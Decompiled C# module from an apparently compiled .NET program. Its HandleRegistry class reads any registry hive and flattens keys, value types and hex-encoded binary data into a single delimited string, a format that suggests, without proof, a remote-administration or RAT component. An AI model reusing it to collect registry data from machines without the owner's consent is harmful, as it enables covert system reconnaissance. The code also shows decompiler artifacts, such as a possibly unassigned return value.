using System;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

// Token: 0x0200000A RID: 10
[StandardModule]
internal sealed class HandleRegistry
{
	// Token: 0x06000086 RID: 134 RVA: 0x00009A9C File Offset: 0x00007C9C
	public static string ReturnRegistry(int type, string directory)
	{
		string text = string.Empty;
		if (HandleRegistry.ReturnSubKey(directory, type) != null)
		{
			RegistryKey registryKey = HandleRegistry.ReturnSubKey(directory, type);
			foreach (string str in registryKey.GetSubKeyNames())
			{
				text = text + str + "◇";
				foreach (string text2 in registryKey.GetValueNames())
				{
					text = text + text2 + "◆";
					switch (registryKey.GetValueKind(text2))
					{
					case RegistryValueKind.Unknown:
						text += "Uknown◆";
						break;
					case RegistryValueKind.String:
						text += "REG_SZ◆";
						break;
					case RegistryValueKind.ExpandString:
						text += "REG_EXPAND_SZ◆";
						break;
					case RegistryValueKind.Binary:
						text += "REG_BINARY◆";
						break;
					case RegistryValueKind.DWord:
						text += "REG_DWORD◆";
						break;
					case RegistryValueKind.MultiString:
						text += "REG_MULTI_SZ◆";
						break;
					case RegistryValueKind.QWord:
						text += "REG_QWORD◆";
						break;
					}
					if (Operators.CompareString(registryKey.GetValue(text2).GetType().Name, "Byte[]", false) != 0)
					{
						text = text + registryKey.GetValue(text2).ToString() + "◆";
					}
					else
					{
						text = text + HandleRegistry.Bytes_To_String((byte[])registryKey.GetValue(text2)) + "◆";
					}
				}
			}
			if (registryKey.GetSubKeyNames().Length == 0)
			{
				foreach (string text3 in registryKey.GetValueNames())
				{
					text = text + text3 + "◆";
					switch (registryKey.GetValueKind(text3))
					{
					case RegistryValueKind.Unknown:
						text += "Uknown◆";
						break;
					case RegistryValueKind.String:
						text += "REG_SZ◆";
						break;
					case RegistryValueKind.ExpandString:
						text += "REG_EXPAND_SZ◆";
						break;
					case RegistryValueKind.Binary:
						text += "REG_BINARY◆";
						break;
					case RegistryValueKind.DWord:
						text += "REG_DWORD◆";
						break;
					case RegistryValueKind.MultiString:
						text += "REG_MULTI_SZ◆";
						break;
					case RegistryValueKind.QWord:
						text += "REG_QWORD◆";
						break;
					}
					if (Operators.CompareString(registryKey.GetValue(text3).GetType().Name, "Byte[]", false) != 0)
					{
						text = text + registryKey.GetValue(text3).ToString() + "◆";
					}
					else
					{
						text = text + HandleRegistry.Bytes_To_String((byte[])registryKey.GetValue(text3)) + "◆";
					}
				}
			}
			registryKey.Close();
			return text;
		}
		return null;
	}

	// Token: 0x06000087 RID: 135 RVA: 0x00009D6C File Offset: 0x00007F6C
	private static string Bytes_To_String(byte[] bytes_Input)
	{
		StringBuilder stringBuilder = new StringBuilder(bytes_Input.Length * 2);
		foreach (byte number in bytes_Input)
		{
			stringBuilder.Append(Conversion.Hex(number) + " ");
		}
		return stringBuilder.ToString();
	}

	// Token: 0x06000088 RID: 136 RVA: 0x00009DB8 File Offset: 0x00007FB8
	public static RegistryKey ReturnSubKey(string name, int type)
	{
		RegistryKey result;
		switch (type)
		{
		case 0:
			result = Registry.ClassesRoot.OpenSubKey(name);
			break;
		case 1:
			result = Registry.CurrentUser.OpenSubKey(name);
			break;
		case 2:
			result = Registry.LocalMachine.OpenSubKey(name);
			break;
		case 3:
			result = Registry.Users.OpenSubKey(name);
			break;
		case 4:
			result = Registry.CurrentConfig.OpenSubKey(name);
			break;
		}
		return result;
	}
}
